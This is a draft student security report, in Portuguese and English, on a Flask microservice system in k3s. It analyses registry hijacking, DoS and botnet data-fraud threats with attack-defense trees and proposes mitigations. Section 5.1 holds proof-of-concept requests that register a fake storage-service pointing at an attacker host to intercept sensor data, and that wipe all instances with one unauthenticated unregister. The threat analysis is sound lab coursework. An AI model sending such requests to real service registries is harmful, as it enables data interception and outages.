# SSLE — Projeto 1
## Design and Run a Service-Based Architecture that Scales

**Autor:** Lucas Rebelo
**Entrega:** 22 de novembro de 2026

Estrutura conforme `Projeto.pdf`, slide 4 ("Classic article/thesis structure"):
Introduction · Relevant State of the Art · Service Architecture Used ·
Risk Management and Mitigation · Approach to three threats considered ·
Evaluation of the solution's approaches and scalability · Conclusions

---

## 1. Introduction

[TODO: objetivo do projeto — desenhar e correr uma arquitetura orientada a
serviços que escale (slide 3); âmbito: deteção, monitorização e prevenção
de ameaças (Projeto 1, vs. tolerância a ataques no Projeto 2); resumo de
uma frase de cada secção seguinte]

---

## 2. Relevant State of the Art

Esta secção resume os conceitos e ferramentas em que o projeto se apoia,
seguindo o syllabus da unidade curricular. Não pretende ser um levantamento
exaustivo da literatura, mas sim enquadrar as escolhas feitas nas secções
seguintes.

### 2.1 Service-Oriented Architecture / Microservices

Os sistemas de ultra-larga escala (ULSS) caracterizam-se por dados,
desenvolvimento e controlo descentralizados, requisitos heterogéneos e em
mudança, evolução contínua em operação e falhas tratadas como regra e não
como exceção (Aula 2, recapitulação do relatório SEI/CMU). A
*Service-Oriented Architecture* (SOA) responde a estes requisitos
organizando a lógica da solução em **serviços**: conjuntos de
funcionalidades acessíveis através de uma interface prescrita e de um
contrato, com políticas de utilização associadas.

Os princípios de orientação a serviços relevantes para este projeto são:
*loose coupling*, contrato de serviço, autonomia, abstração, reutilização,
composição, *statelessness* e *discoverability*, a que se soma o
encapsulamento de serviços legados. Os papéis definidos são o **Service
Provider**, que publica as suas capacidades; o **Service Consumer**, que
procura e invoca serviços ("intent driven"); e o **Service Broker**, cujo
caso mais comum é o **Service Registry**, que media a descoberta
(*publish → find → bind*).

Os **microsserviços** são uma variante mais informal de SOA: não existe um
*bus* central de mensagens, e os serviços descobrem-se através do registry
e comunicam diretamente entre si (tipicamente REST/HTTP). Este é o modelo
adotado no projeto (secção 3).

Do ponto de vista de segurança, a Aula 2 destaca dois pontos que são
diretamente relevantes para as ameaças da secção 5:
- o encapsulamento permite acrescentar controlos de segurança granulares
  sobre serviços que não foram desenhados para isso;
- TLS/HTTPS (e mTLS) garante confidencialidade, integridade e autenticação
  entre serviços e brokers, assente numa PKI cuja validação (extensões,
  CRLs) exige cuidado. A ausência destes controlos, num registry que é por
  definição um ponto de confiança, é a raiz da Ameaça 1.

Para o *deployment* recorre-se ao modelo da indústria de telecomunicações e
cloud (Guião 2): um *Virtual Infrastructure Manager* no sentido ETSI NFV
(aqui o **Incus**, fork do LXD) fornece contentores e redes, e uma camada
PaaS (**k3s**, distribuição leve de Kubernetes) orquestra as imagens Docker
dos serviços, com escalamento horizontal por réplicas.

### 2.2 FCAPS e Fault Management

O modelo **FCAPS** (ISO/IEC 7498-4:1989), adotado pela ITU-T no modelo TMN
(M.3000), divide a gestão de redes em cinco áreas: **Fault**
(comportamento anómalo, seja por avaria, erro de configuração ou evento
externo), **Configuration** (recolha, alteração e rastreio de
configurações), **Accounting** (consumo de recursos e faturação),
**Performance** (QoS e KPIs medidos face aos SLAs) e **Security**
(proteção dos ativos segundo a tríade CIA, com ênfase em controlo de acesso
e gestão de identidades).

O workflow de *Fault Management* (Lesson03/04) segue cinco fases:
**Detecting** (os dados de monitorização mostram um desvio do normal) →
**Diagnosing and Isolating** (identificar o problema, a sua origem e
localização) → **Correlating** (analisar dependências e histórico de falhas
em conjunto, chegando a uma lista curta de causas) → **Resolution /
Mitigation** → **Post-Mortem** (validar a solução e documentar as lições
aprendidas). Esta estrutura é reutilizada na discussão de cada ameaça
(secção 5).

Como nota o enunciado do projeto, *"Fault Management within FCAPS does not
deal with security events (i.e., at least explicit security events)"*. Um
ataque de DoS, por exemplo, surge primeiro como uma falha de Performance ou
Fault, sem ser identificado como incidente de segurança. Daí a necessidade
de complementar a monitorização FCAPS com um SIEM (secção 2.4) e de
correlacionar os dois.

A Aula 3 observa ainda que um sistema FCAPS completo, normalizado em 1989,
é praticamente impossível de implementar em larga escala sem SOA: os
requisitos mudam, os serviços são heterogéneos e o escalamento horizontal é
o que permite acompanhar o crescimento. Plataformas reais (OpenStack, Nokia
Cloud Mobility Manager, AGORA da Altice Labs) seguem precisamente esta
abordagem de serviços fracamente acoplados.

### 2.3 Monitorização de larga escala: Prometheus / Zabbix

Para detetar falhas é preciso primeiro observar e recolher métricas. Estas
vêm de várias fontes (*probes*) e só se tornam indicadores depois de
interpretadas; a ADTree indica quais as partes do sistema mais sensíveis e
que, por isso, merecem monitorização dedicada (Lesson04). As soluções
abordadas na unidade curricular são:

| Solução | Modelo | Pontos fortes | Limitações |
|---|---|---|---|
| **Prometheus** (+ Alertmanager, Grafana) | *Pull*: faz *scrape* HTTP a *exporters*; *Pushgateway* para jobs de curta duração | Nativo em Kubernetes (service discovery), PromQL, alerting integrado | Pensado para métricas, não para logs; federação necessária para vários sites |
| **TICK** (Telegraf, InfluxDB, Chronograf, Kapacitor) | *Push* de agentes para uma TSDB | Serviços fracamente acoplados, flexível, débito elevado | Escalamento sobretudo vertical; clustering exige licença comercial |
| **Zabbix** (server, proxy, agentes) | Agentes ativos/passivos, com *proxies* por site | Muito integrado, templates, dependências entre *triggers* | Menos adequado a escala massiva, segundo a Lesson04 |

O enunciado recomenda o Prometheus. Neste projeto foi usado **Zabbix**,
substituição autorizada pelo docente. A escolha justifica-se por dois
requisitos da arquitetura:
1. **Monitorização por localização com otimização de largura de banda**
   (slide 7, bónus). O **Zabbix proxy** recolhe localmente os dados de um
   site e envia-os agregados ao servidor central, o que corresponde
   diretamente a este requisito. Em Prometheus o equivalente exige
   federação ou *remote write*.
2. **NAT entre o site Incus e o servidor central.** O proxy em modo ativo
   inicia a ligação para fora, dispensando *port forwarding*. Já o modelo
   *pull* do Prometheus exige que o servidor alcance cada alvo.

As *trigger dependencies* do Zabbix cumprem o papel das *inhibit rules* do
Alertmanager: suprimem alertas derivados (ex.: "ingestion lenta") quando a
causa-raiz ("registry em baixo") já está ativa, o que apoia a fase de
*Correlating* do workflow FCAPS.

### 2.4 SIEM e Attack-Defense Trees

**SIEM.** Um *Security Information and Event Management* (Aula 5) combina:
*log management* (recolha de rede, servidores, aplicações, endpoints e
cloud); **SIM** (armazenamento de longo prazo para análise, auditoria e
compliance); **SEM** (monitorização em tempo real, regras, *threat
intelligence* e alertas); **normalização e correlação** (formato comum e
ligação entre eventos aparentemente independentes); **MSS** (resposta
automatizada, como isolar sistemas ou bloquear IPs); e *compliance and
reporting*. O enunciado pede foco nos quatro primeiros.

Um SIEM é potenciado por capacidades de **XDR / HIDS**: agentes nos hosts
que pré-correlacionam logs, verificam integridade de ficheiros, detetam
rootkits e executam *active response*. O **OSSEC** é o HIDS open-source de
referência, e o **Wazuh** (recomendado no enunciado e usado no Guião 4)
estende-o com agente multiplataforma, servidor de análise (regras,
enriquecimento MITRE ATT&CK e compliance), *indexer* e *dashboard*.
Alternativas comerciais referidas no syllabus incluem IBM QRadar, Splunk e
Microsoft Sentinel.

Neste projeto usa-se o **Elastic Stack** (Filebeat → Elasticsearch →
Kibana/Elastic Security). A escolha é coerente com o estado da arte: o
próprio Wazuh foi construído sobre o Elastic Stack e o seu *indexer* é um
fork do OpenSearch, pelo que o modelo de dados (documentos JSON em índices,
*shards* e réplicas) e as capacidades de pesquisa e correlação são
equivalentes. O Filebeat, com metadados de Kubernetes, enriquece cada log
com o pod e o node de origem, o que, junto com o `instance_id` do esquema
de naming (secção 3.2), permite localizar rapidamente a fonte de um
incidente. A contrapartida é que o Elastic não traz de raiz o HIDS nem o
*active response* do Wazuh. As ações de resposta são por isso
implementadas à parte (secção 5), e esta limitação é retomada nas
conclusões.

**Attack surface e CAPEC.** A superfície de ataque é o conjunto de todos os
pontos de entrada através dos quais um atacante pode afetar a
confidencialidade, integridade ou disponibilidade do sistema (Lesson04).
O MITRE CAPEC organiza os padrões de ataque por **domínio** (CAPEC-3000:
comunicações, software, hardware, supply chain, engenharia social,
segurança física) e por **mecanismo** (CAPEC-1000: interações
enganadoras/*spoofing*, abuso de funcionalidade existente, manipulação de
recursos, injeção, técnicas probabilísticas, manipulação de *timing* e
estado, recolha de informação, subversão de controlo de acesso, entre
outros). As três ameaças tratadas na secção 5 situam-se no domínio de
comunicações e software e correspondem, respetivamente, a *spoofing* /
subversão de controlo de acesso (registry), abuso de funcionalidade /
manipulação de recursos (DoS) e recolha de informação seguida de injeção
de dados (botnet / fraude).

**Attack-Defense Trees.** As ADTrees (Kordy et al., *Foundations of
Attack–Defense Trees*, 2010) representam numa única árvore os ataques e as
respetivas contramedidas, ao contrário das abordagens que separam árvores
de ataque e de defesa. A raiz representa o objetivo mais geral do atacante
e cada nível especializa-o. Os **nós de ataque** (círculos vermelhos)
representam ativos visados perto da raiz e formas concretas de ataque nas
folhas. Os **nós de defesa** (retângulos verdes) representam contramedidas,
com mais detalhe de execução quanto mais perto das folhas. As relações são:
**refinamento disjuntivo** (OR: basta um filho), **refinamento conjuntivo**
(AND: todos os filhos têm de se verificar) e **countermeasure** (linha
pontilhada, uma defesa aplicada a um ataque, que pode por sua vez ser
contrariada por outro ataque). Esta distinção OR/AND é usada na secção 4.4
para priorizar mitigações: num ramo conjuntivo, basta bloquear um dos
passos para neutralizar o ataque completo.

---

## 3. Service Architecture Used

### 3.1 Visão geral

Sistema SOA baseado nos Guiões 1 e 2 da disciplina: 5 microsserviços Flask
(Service Registry, Ingestion, Storage, Analytics, Sensor), empacotados como
imagens Docker e orquestrados em cluster k3s (k3s-master + k3s-node1) dentro
de contentores Incus.

```
sensor → [discover via registry] → ingestion → [discover via registry] → storage
                                                                              ↑
                                                                        analytics
                                                                     (discover via registry)
```

[TODO: inserir diagrama de arquitetura]

### 3.2 Identificação e naming hierárquico (slide 7)

Esquema implementado em `common.py`:

```
<país>.<região>.<datacenter>.<rack>.<node>.<serviço>.<instância>
ex: pt.centro.dc-incus.k3s.k3s-node1.storage-service.storage-f6f4dbd-lvwth
```

Propaga-se como campo `location` no Service Registry. Cobre os 4 aspetos
pedidos no slide 7:
- **Localização física/lógica:** país→região→datacenter→rack→node
- **Delegação geográfica:** campos independentes por nível
- **Monitorização por localização / bónus de largura de banda:**
  [TODO: Zabbix proxy por site — descrever a arquitetura de 2 sites
  discutida]
- **Localização rápida da origem de um incidente:** o `instance_id` é a
  chave de correlação partilhada entre o registry, os logs e o SIEM

### 3.3 Topologia de rede e infraestrutura

- VM Debian (`lucas@ssle`) hospeda o Incus
- Bridge `incus-default`, NAT, rede `10.255.255.0/24`
- Cluster k3s: `k3s-master` (10.255.255.42) + `k3s-node1`
- Serviços expostos via NodePort: registry (30050), ingestion (30001),
  analytics (30003); storage em ClusterIP
- Sem NetworkPolicies no namespace `ssle`

[TODO: inserir diagrama de topologia — VM → Incus → k3s → pods]

### 3.4 Integração com monitorização/SIEM

[TODO: Zabbix proxy no site Incus (modo ativo, devido ao NAT) +
Filebeat → Elasticsearch; correlação FCAPS↔segurança via webhook do
Alertmanager/Zabbix para o SIEM]

---

## 4. Risk Management and Mitigation

### 4.1 Attack surfaces

[TODO: mapa de superfície de ataque do sistema — endpoints expostos,
pontos de confiança (registry), fronteiras de rede (NodePort/ClusterIP/NAT)]

### 4.2 Attack and Defense Trees

Metodologia: notação de Kordy et al. (Lesson04, slides 21-25) — nós de
ataque (círculo vermelho), nós de defesa (retângulo verde), disjunctive/
conjunctive refinement, countermeasures. Três ADTrees construídas para as
ameaças da secção 5, disponíveis em `adtrees-ssle-projeto1.md` e como
export do attacktree.online (Anexo C/D).

### 4.3 Large-scale system monitoring

[TODO: como o esquema de naming (3.2) e a correlação Zabbix/Elastic
suportam deteção e root-cause analysis à escala — referir Alertmanager
inhibit rules / trigger dependencies]

### 4.4 Priorização de mitigação

Das três ameaças selecionadas (secção 5), duas (Hijacking, DDoS)
apresentam risco estrutural elevado por serem exploráveis num único passo
(disjunctive refinement). A terceira (Botnet/Fraude) depende de uma cadeia
de dois passos obrigatórios (conjunctive refinement): divulgação do IP do
pod seguida de escrita direta. Uma única mitigação de baixo custo —
impedir a divulgação de URLs internos no registry — neutraliza o ataque
completo, sem necessidade das mitigações mais caras (ex. credencial por
dispositivo). Esta observação informa a ordem de prioridade de
implementação: [TODO — ordenar as mitigações por Effort/Impact]

---

## 5. Approach to Three Threats Considered in the Course Syllabus

Ameaças escolhidas: **Route and signals hijacking**, **Massive
denial-of-service disruptions**, **Botnets** (combinado com fraude de
dados/Reputation Systems). Para cada uma, a estrutura segue exatamente os
6 pontos pedidos no slide 12 ("Discussion of results").

### 5.1 Ameaça 1 — Route/Signals Hijacking

- **Description of the threat:**
  Exploits the absence of authentication on the custom Service Registry
  (Flask REST API, port 5050/NodePort 30050). An attacker registers a
  malicious endpoint as "storage-service" (`registry.py` `/register`),
  causing round-robin discovery to route a portion of traffic to the
  attacker (data interception/tampering). Alternatively, `DELETE
  /unregister` without an `instance_id` wipes all registered instances of
  a service, causing a denial of service that self-recovers only via the
  15s heartbeat.

- **Why is it relevant to the system?**
  The Service Registry is the single point of trust every other component
  depends on blindly: Sensor, Ingestion, Storage and Analytics all resolve
  each other exclusively through it (`discover()` in `common.py`).
  Compromising this one component compromises the entire data flow, making
  it the highest-value target in the architecture.

- **How can it be exploited?**
  - **Attack Path 1 — Unauthenticated registration of malicious
    storage-service instance:** `POST /register` accepts arbitrary
    `name`/`url`/`instance_id`/`location` fields with no authentication.
    An attacker registers an instance named `storage-service` pointing to
    an attacker-controlled endpoint. The registry's round-robin load
    balancer (`get_service()`) then routes a fraction of all
    `storage-service` lookups to the attacker, enabling data interception
    and falsified location/geography metadata.
  - **Attack Path 2 — Unauthenticated service wipe via mass unregister:**
    `DELETE /unregister` accepts `{"name": "<service>"}` without requiring
    `instance_id`. When `instance_id` is omitted, the registry clears ALL
    registered instances of that service in a single unauthenticated
    request (`registry.py`: `registry[name].clear()`). Repeated every few
    seconds, this sustains a persistent denial of service despite the 15s
    self-healing heartbeat.
  - **Attack Path 3 — Registry reachable externally via Kubernetes
    NodePort:** `10-registry.yaml` exposes the registry as `type=NodePort`
    (30050) with no NetworkPolicy restricting ingress. This makes Paths 1
    and 2 exploitable from any host with network reachability to the k3s
    nodes, not only from within the cluster.
  - ADTree: `adtrees-ssle-projeto1.md`, árvore 1 (disjunctive refinement —
    qualquer um dos 3 paths é suficiente)

- **Relevant monitoring/mitigation actions/metrics:**
  - Require mutual TLS and identity-bound registration (Development, High
    effort, Preventive): client certificate CN must match the registered
    `name`, closing Attack Path 1.
  - Require `instance_id` and restrict deletion to caller's own identity
    (Development, Low effort, Preventive): removes the
    `registry[name].clear()` code path, closing Attack Path 2.
  - Restrict registry Service to ClusterIP, remove NodePort exposure
    (Configuration, Low effort, Preventive): closes Attack Path 3.
  - Alert on registration anomalies (Configuration, Medium effort,
    Detective): monitor for registration overwrites or location fields
    inconsistent with known deployment regions.
  - [TODO: métricas concretas do Zabbix/Elastic após ligação — taxa de
    `POST /register`/`DELETE /unregister`, cardinalidade de
    `instance_id` por serviço]

- **Action-response adopted:**
  PoC executada com um contentor Incus dedicado (`attacker`,
  `10.255.255.184`) na mesma rede `incus-default` dos nós k3s, simulando
  um atacante já presente no site (cenário "lab": atacante adjacente,
  distinto do cenário "produção" descrito em 3.3, onde o NodePort
  tornaria o registry acessível também de fora do site). O atacante correu
  um endpoint HTTP próprio (porta 9999) que responde `200 OK` em
  `GET /health` — sobrevivendo deliberadamente ao health-checker do
  registry (`MAX_FAILURES=3`, `HEALTH_INTERVAL=10s`) — e regista em log
  todo o conteúdo recebido em `POST /store`.

  **Fase A — Registo da instância falsa:**
  ```
  POST /register
  {"name":"storage-service","url":"http://10.255.255.184:9999",
   "instance_id":"xx.evil.dc-evil.rack0.nodeX.storage-service.pwned",
   "location":{"country":"xx","region":"evil","datacenter":"dc-evil",
               "rack":"rack0","node":"nodeX"}}
  → 200 OK
  ```
  Nenhuma validação de identidade foi exigida pelo registry, confirmando
  V1. O round-robin de `get_service()` passou de imediato a alternar entre
  a instância real e a falsa (confirmado em 6 pedidos consecutivos, ver
  evidência `poc1-roundrobin-alternancia.txt`).

  **Fase B — DoS via unregister em massa:**
  ```
  DELETE /unregister {"name":"storage-service"}
  → 200 OK {"message":"unregistered"}
  ```
  Um único pedido não autenticado removeu simultaneamente a instância
  real **e** a falsa, confirmando V2. O sistema demonstrou o
  comportamento de autorrecuperação previsto: a instância real
  reapareceu via heartbeat (`registered_at` passou para o instante do
  próximo re-registo, ~15s depois do `unregister`), mas a instância
  falsa não — por não implementar o padrão de heartbeat do
  `register_service()` de `common.py`, ficando permanentemente fora do
  registry até um novo `POST /register` manual.

- **Post-mortem of PoC:**
  - **Impacto observado:** a Fase A resultou em interceção **contínua e
    sustentada** de dados reais do sensor (`pt.centro.dc-incus.sensor-
    dc9b95965-mlt4f`) ao longo de aproximadamente 2 horas ininterruptas
    (18:54:02–20:51:13, UTC — contentores Incus em `Etc/UTC`, VM
    hospedeira em `Europe/Lisbon`/WEST; ver nota metodológica abaixo),
    sem qualquer indicação de erro do lado do `ingestion-service` — o
    atacante recebeu exatamente as mesmas temperaturas reais que seriam
    entregues ao Storage legítimo, em cada ciclo de 5s do sensor.
  - **Nenhum controlo de deteção estava ativo durante a PoC**, pelo que o
    ataque não gerou qualquer alerta — confirma o risco "Alto" atribuído
    na ADTree (árvore 1) e a prioridade de implementação de `Alert on
    registration anomalies` descrito em "Relevant monitoring/mitigation
    actions/metrics" acima.
  - **A Fase B confirmou a assimetria de recuperação:** o `/unregister`
    não distingue entre instâncias legítimas e maliciosas, mas o
    mecanismo de recuperação (heartbeat) só beneficia serviços
    corretamente implementados — um atacante teria de reemitir o
    `/register` periodicamente para manter persistência, o que por si só
    é um padrão observável (repetição de registos com o mesmo
    `instance_id` suspeito) para a regra de deteção proposta.
  - **Limitação identificada:** a ausência de autenticação ou autorização
    nos dois endpoints (`/register`, `/unregister`) torna esta PoC
    trivialmente reprodutível por qualquer entidade com acesso de rede ao
    registry, sem qualquer conhecimento prévio do sistema — reforça a
    classificação de Complexity "Ordinary" atribuída na ADTree.
  - Evidência: `evidencia/poc1-registry-poisoned.json`,
    `evidencia/poc1-roundrobin-alternancia.txt`,
    `evidencia/poc1-intercepted-data.log`,
    `evidencia/poc1-unregister-dos.json`

### 5.2 Ameaça 2 — Massive Denial-of-Service

- **Description of the threat:**
  Two distinct vectors converge on the same impact. (1) Low-volume: `GET
  /anomalies?limit=-1` is forwarded unvalidated from `analytics.py` to
  `storage.py`, where SQLite interprets `LIMIT -1` as unbounded, forcing a
  full-table dump per request (CWE-770). (2) Volume-based: `POST /ingest`
  has no rate limiting; each request triggers a synchronous `discover()`
  call against the Service Registry, amplifying load onto the
  single-instance registry (SPOF, in-memory state). Werkzeug's development
  server (single-threaded by default) and low Kubernetes CPU limits (250m)
  lower the threshold further.

- **Why is it relevant to the system?**
  "Massive denial-of-service disruptions" is an explicit threat in the
  course syllabus. In this architecture the impact is compounded by
  architectural choices specific to the system: a single point of
  amplification (the registry, queried on every ingest) and a single
  point of persistence (SQLite behind one Storage replica), meaning even
  a low-volume attack can degrade the entire pipeline, not just the
  endpoint it targets directly.

- **How can it be exploited?**
  - **Attack Path 1 — Unbounded query via negative limit parameter:**
    `GET /anomalies?limit=-1` (analytics-service, port 5003) forwards the
    `limit` parameter unvalidated to `GET /temperatures` on
    storage-service. SQLite interprets "LIMIT -1" as no limit, forcing a
    full table scan and serialization of every stored reading in a single
    request.
  - **Attack Path 2 — Unthrottled flood against /ingest amplified by
    registry lookups:** `POST /ingest` (ingestion-service, port
    5001/NodePort 30001) has no authentication, no rate limiting, and no
    request size cap. Each request triggers a synchronous `discover()`
    call to the Service Registry, so request volume is amplified onto the
    single-replica, in-memory registry (SPOF). Low Kubernetes CPU limits
    (250m per pod) and Werkzeug's default single-threaded dev server
    lower the volume needed to cause saturation.
  - ADTree: `adtrees-ssle-projeto1.md`, árvore 2 (disjunctive refinement —
    qualquer um dos 2 paths é suficiente)

- **Relevant monitoring/mitigation actions/metrics:**
  - Enforce `1 <= limit <= 1000` in `storage.py` and `analytics.py`
    (Development, Low effort, Preventive): closes Attack Path 1.
  - Rate limiting on `/ingest` (Development, Medium effort, Preventive):
    per-IP or per-`device_id`, e.g. Flask-Limiter.
  - Decouple service registry discovery (Development, Medium effort,
    Preventive): client-side discovery cache with TTL, circuit breakers.
  - Replace Werkzeug with production WSGI server (Configuration, Low
    effort, Preventive): gunicorn/uWSGI with multiple workers.
  - Tune Kubernetes resource requests/limits (Configuration, Low effort,
    Preventive).
  - Configure Zabbix/Elastic alerts for DDoS indicators (Configuration,
    Medium effort, Detective): request-rate spikes on `/ingest` e
    `/anomalies`, latência do registry, taxa de 5xx, duração de queries
    SQLite.
  - [TODO: métricas concretas após ligação do Zabbix/Elastic]

- **Action-response adopted:** [TODO — após execução da PoC]

- **Post-mortem of PoC:** [TODO — após execução]

### 5.3 Ameaça 3 — Botnets / Data Fraud

- **Description of the threat:**
  `GET /services` on the registry discloses internal pod IPs (bypassing
  the ClusterIP abstraction). With the Storage pod's real address, an
  attacker writes directly to `POST /store`, which performs no type or
  range validation independently of `ingestion.py` — the validation
  implemented there (temperature range, `device_id` truncation) is
  entirely bypassed. No credential or identity is tied to `device_id`,
  enabling impersonation of an arbitrary number of fabricated sensors
  (botnet simulation) and poisoning of analytics-service outputs
  (`/average`, `/anomalies`).

- **Why is it relevant to the system?**
  Covers both "Botnets" and "Reputation Systems" from the syllabus: the
  lack of per-device identity means `device_id` functions as an
  unauthenticated reputation claim, and the architecture has no mechanism
  to distinguish a real sensor fleet from an arbitrarily large forged one.
  This directly undermines the trustworthiness of Analytics outputs,
  which downstream monitoring and root-cause analysis would otherwise
  rely on.

- **How can it be exploited?**
  - **Attack Path 1 — Internal pod IP disclosure via unauthenticated GET
    /services:** `GET /services` on the registry returns full internal
    state including pod IPs (e.g. `10.42.1.46:5002` for
    `storage-service`), bypassing the Kubernetes ClusterIP abstraction
    (storage Service is `type=ClusterIP`, intended to be the only path to
    the Storage pod).
  - **Attack Path 2 — Direct unauthenticated write to Storage, bypassing
    Ingestion validation:** `POST /store` (storage-service) performs no
    type or range validation independent of `ingestion.py`. An attacker
    with the pod IP from Path 1 writes directly to `/store`, bypassing
    all validation implemented in `ingestion.py` (temperature range
    check, `device_id` truncation). No credential is bound to
    `device_id`, allowing impersonation of an arbitrary number of
    fabricated sensors and poisoning of analytics-service's `/average`
    and `/anomalies` outputs.
  - ADTree: `adtrees-ssle-projeto1.md`, árvore 3 — **conjunctive
    refinement**: ao contrário das ameaças 1 e 2, os dois passos são
    ambos necessários (AND), o que reduz estruturalmente a probabilidade
    face aos vetores de um único passo. Ver 4.4 para a implicação na
    priorização de mitigação.

- **Relevant monitoring/mitigation actions/metrics:**
  - Do not expose internal pod URLs in unauthenticated registry reads
    (Development, Low effort, Preventive): closes Attack Path 1 — e, por
    ser o primeiro elo da cadeia AND, é suficiente para neutralizar o
    ataque completo (ver 4.4).
  - NetworkPolicy restricting Storage pod ingress (Configuration, Low
    effort, Preventive): apenas `ingestion-service` e `analytics-service`
    podem alcançar o Storage.
  - Replicate type/range validation inside `storage.py` (Development, Low
    effort, Preventive): defesa em profundidade, independente do Path 1.
  - Per-device credential bound to `device_id` (Development, High effort,
    Preventive): token ou certificado por sensor.
  - Anomaly scoring on `device_id` cardinality (Configuration, Medium
    effort, Detective): deteção de picos de `device_id` distintos por
    janela temporal, sinal de frota de sensores forjada.
  - [TODO: métricas concretas após ligação do Zabbix/Elastic]

- **Action-response adopted:** [TODO — após execução da PoC]

- **Post-mortem of PoC:** [TODO — após execução]

---

## 6. Evaluation of the Solution's Approaches and Scalability

[TODO: testes de carga, cardinalidade de séries no Zabbix/Elastic, EPS do
SIEM, latência de scrape/ingestão vs. número de nós/réplicas; comparação
do comportamento do sistema com e sem as mitigações implementadas]

---

## 7. Conclusions

[TODO: principais achados e contributos; secção explícita "porque a
solução não é perfeita" (slide 13) — SPOFs documentados (registry e
storage com 1 réplica), perfil Incus privilegiado nos nós k3s, SNAT nos
NodePorts afetando atribuição de origem, Werkzeug como servidor de
desenvolvimento; ponte para trabalho futuro (Projeto 2 — tolerância a
ataques, reutilizando esta arquitetura)]

---

## Anexos

- A. Evidência "antes" (`evidencia/antes/`)
- B. Evidência das PoCs (`evidencia/poc{1,2,3}-*`)
- C. ADTrees completas (`adtrees-ssle-projeto1.md`)
- D. Export do attacktree.online
